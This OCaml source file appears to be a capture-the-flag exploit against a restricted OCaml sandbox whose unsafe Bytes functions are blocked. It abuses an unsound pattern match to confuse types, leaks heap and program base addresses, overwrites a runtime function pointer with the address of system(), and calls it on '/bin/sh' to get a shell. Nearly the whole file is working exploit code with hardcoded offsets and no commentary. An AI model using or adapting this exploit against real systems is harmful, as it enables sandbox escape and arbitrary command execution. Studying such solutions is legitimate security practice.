(* thank you @strikeskids :pray: *)
open struct
  let blocked = `Blocked

  module Blocked = struct
    let blocked = blocked
  end
end
module Fixed_bytes = struct
    include Bytes

    let unsafe_blit = blocked
    let unsafe_blit_string = blocked
    let unsafe_fill = blocked
    let unsafe_get = blocked
    let unsafe_set = blocked
    let unsafe_of_string = blocked
    let unsafe_to_string = blocked
end

(* Present for you *)
open Printf
open Fixed_bytes
(* :) *)

let magic x = let l = ref None in l := Some(x); let Some(x) = !l in x;;

let set_int bs v =
        set bs 0 (char_of_int((v lsr 0) mod 256));
        set bs 1(char_of_int ((v lsr 8) mod 256));
        set bs 2(char_of_int ((v lsr 16) mod 256));
        set bs 3(char_of_int ((v lsr 24) mod 256));
        set bs 4(char_of_int ((v lsr 32) mod 256));
        set bs 5(char_of_int ((v lsr 40) mod 256));
        set bs 6(char_of_int ((v lsr 48) mod 256));
        ()

let toptr v =
        let bs = create 8 in
        set_int bs v; magic bs

let setptr bs v =
        let bs = magic bs in
        set_int bs v

let () =
        let x = magic (fun x -> x) in
        let heap_base = !x * 2 - 0x33a44 in

        let table = (0x366f0 + heap_base)  in
        printf "heap_base: 0x%x\ntable: 0x%x\nint_of_string_ptr: 0x%x\n" heap_base (table) (table+0x708);

        let int_of_string_ptr_ptr = toptr (table+0x708) in
        printf "int_of_string_ptr_ptr: 0x%x\n" (2 * magic int_of_string_ptr_ptr);
        let int_of_string_ptr = !int_of_string_ptr_ptr in
        let program_base = (!int_of_string_ptr * 2) - 0x6810 in

        printf "program_base: 0x%x\n" program_base;
        let system_addr = program_base + 0x10da0 in
        printf "int_of_string_ptr: 0x%x\n" (2 * int_of_string_ptr);
        flush stdout;
        (*let x = read_int () in*)
        let ftoi = !(toptr table) in
        setptr ftoi system_addr;
        let y = abs_float (magic "/bin/sh") in
        printf "%x %f\n" x y
